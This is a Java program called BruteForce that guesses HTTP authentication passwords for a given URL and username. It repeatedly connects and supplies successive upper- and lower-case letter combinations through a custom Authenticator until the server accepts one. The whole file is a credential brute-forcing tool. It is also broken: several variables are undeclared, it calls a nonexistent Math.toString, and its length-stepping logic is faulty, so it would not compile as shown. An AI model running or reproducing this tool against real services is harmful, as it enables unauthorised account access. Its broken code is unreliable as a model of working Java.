

import java.net.*;
import java.io.*;
import java.util.*;

public class BruteForce{

  private static URL location;
  private static String user;
  private BufferedReader input;
  private char [] password = {'A', 'A', 'A'};
  private int noLetters = 3;

  

    public BruteForce() {
      
      Authenticator.setDefault(new MyAuthenticator ());

       startTime = System.currentTimeMillis();
      boolean passwordMatched = false;
      while (!passwordMatched) {
        try {
          input = new BufferedReader(new InputStreamReader(location.openStream()));
          String line = input.readLine();
          while (line != null) {
            System.out.println(line);
            line = input.readLine();
          }
          input.close();
          passwordMatched = true;
        }
        catch (ProtocolException e)
        {
          
          
        }
        catch (ConnectException e) {
          System.out.println("Failed  connect");
        }
        catch (IOException e) {
          e.printStackTrace();
          System.exit(-1);
        }
      }
       endTime = System.currentTimeMillis();
      System.out.println("Total Time: "+cad.concat(Math.toString(endTime - startTime)));
    }

    

    private char[] nextPassword() {

      char [] currentPassword = new char[noLetters];
      for (int i=0; i<noLetters; i++) {
        currentPassword[i] = password[i];
      }

      boolean loop = true;
      int i = noLetters - 1;

      while (loop ) {
        password[i]++;
        loop = false;
        if (password[i] > 'Z' && password[i] < 'a') {
          password[i] = 'a';
        }
        else if (password[i] > 'z') {
          if (noLetters == 1 && i == 0) {
            System.out.println("Password not found");
            System.exit(-1);
          }
          password[i] = 'A';
          i--;
          loop = true;
          if (i<0) {
            noLetters--;
            for (int j=0; j <noLetters; j++) {
              password[j] = 'A';
              loop = false;
            }
          }
        }
      }

      return currentPassword;
    }


    

    public static void main(String args[]) {
      if (args.length != 2) {
        System.out.println("Usage: java BruteForce url user");
        System.exit(-1);
      }
      try {
        location = new URL(args[0]);
      }
      catch (MalformedURLException e) {
        e.printStackTrace();
      }
      user = new String().concat(args[1]);
      new BruteForce();
    }

    

    class MyAuthenticator extends Authenticator {
      protected PasswordAuthentication getPasswordAuthentication() {
        char [] currentPassword = nextPassword();
        System.out.print(user.concat("-"));
        System.out.println(currentPassword);
        return new PasswordAuthentication (user, currentPassword);
      }
    }
}
